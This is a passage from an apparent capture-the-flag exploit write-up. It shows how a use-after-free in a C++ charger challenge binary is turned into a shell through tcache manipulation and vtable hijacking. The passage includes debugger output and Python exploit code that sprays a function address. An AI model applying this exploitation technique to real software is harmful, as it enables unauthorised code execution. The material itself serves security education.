0x608d30: 0x00401bdc

wdb> x/x 0x00401bdc
0x401bdc: 0xe5894855

wdb> x/i 0x00401bdc
0x401bdc <StandardChargeGun::uses_port+0>:    push rbp
```

Here, you can see we created a StandardChargeGun subtype, so that's where the function resolves. Additionally, you'll notice that `ChargeGun::uses_port` has no debugger labels, so you'll need to pay attention to the subclass implementations. The fact that it maps to a common supertype is important to keep in mind.

 Now that we better understand the *intended behavior* of this method, let's circle back to the actual, problematic behavior. We proved that the UAF condition can manifest simply by creating a charge plug. If we control the vtable, we could control the code pointed-to in the call to `ChargeGun::uses_port`.

As noted earlier, there is some sparse indication that this binary is using some form of GLIBC 2.27:

```
wdb> info proc mappings
...
0x7f0000000000-0x7f0000029000 r-x ld-2.27.so
0x7f0000029000-0x7f000002b000 rw-
0x7f000002b000-0x7f000002e000 rw-
0x7f0000229000-0x7f000022a000 r-- ld-2.27.so
0x7f000022a000-0x7f000022c000 rw- ld-2.27.so
...
0x7f00007c4000-0x7f00009ab000 r-x libc-2.27.so
0x7f00009ab000-0x7f0000bab000 --- libc-2.27.so
0x7f0000bab000-0x7f0000baf000 r-- libc-2.27.so
0x7f0000baf000-0x7f0000bb1000 rw- libc-2.27.so
```

We can recall the tcache behavior and how the use of character buffers facilitates arbitrary executions. As it turns out, we have some opportunity to abuse this if we look to the `ChargeGun::description` field:

```c++
class ChargeGun {
    public:
        ...
        char* description;

        ChargeGun() : plugged_in(false), description(0) {}
        virtual ~ChargeGun() { delete description; }
        ...
};
```

You'll notice that neither supertype has a method to safely handle or sanitize the description. Instead, as a public field, other functions can directly read and write that value. Only the supertype's destructor plays any role in attempting to handle its destruction; but, as we will see in a bit, the behavior as defined is insufficient.

The `ChargeGun::description` is initialized in the `add_gun` function body:

```
void add_gun() {
    ...
    
    ChargeGun* ngun;
    ...
    
    if (dlen) {
        ngun->description = new char[dlen+1];
        printf("Enter description (manufacturer, ampacity, etc...): ");
        fgets(ngun->description, dlen+1, stdin);
        ...
    }
    ...
    charger.guns.push_back(ngun);
}
```

Additionally, we know that each charge plug's destructor is invoked under two conditions: when the user explicitly removes it (option 2), or when the vector is destroyed in the Charger's own destructor (bug). This gives us an opportunity to create a `ChargeGun`-sized buffer which is *free*'d after the user exits `main`; if we can create a tcache of user-controlled data, we can try to invoke the address of `Charger::debug_mode` and get a shell.

To control the value of RAX, we can play with loops of creating, and corresponding loops of destroying, the `description` buffer. From analyzing the toy code earlier, we know that the vector's internal size will equal the number of `push_back` calls multiplied by 8, the size of a 64-bit pointer. We can perform fuzzing exercises by creating different amounts of buffers, free-ing the first one (index `0`), and allowing the UAF condition to take the spotlight.

In this case, three is the magic number:

```python
create_iters = 3
payload_size = create_iters * 8
payload = "A" * payload_size

for _ in range(create_iters):
    p.sendline("1")
    p.sendline("1")
    p.sendline(str(payload_size))
    p.sendline(payload)

p.sendline("2")
p.sendline("0")

p.sendline("6")
```

Our fuzz payload is at RAX.

```
Segmentation Fault
...

wdb> x/i $pc
0x402074 <Charger::on_port_disconnected+142>:  call rax

wdb> print $rax
$8 = 0x4141414141414141
```

Now, let's modify the payload to send the address of `Chager::debug_mode`:

```
wdb> print Charger::debug_mode
$9 = 0x402248
```

We can spray this address on each iteration of the loop:

```python
create_iters = 3
payload_size = create_iters * 8
debug_addr = p64(0x402248)
payload = b''.join([debug_addr for _ in range(create_iters)])

for _ in range(create_iters):
    p.sendline("1")
    p.sendline("1")
    p.sendline(str(payload_size))
    p.sendline(payload)
```

This gives us a shell.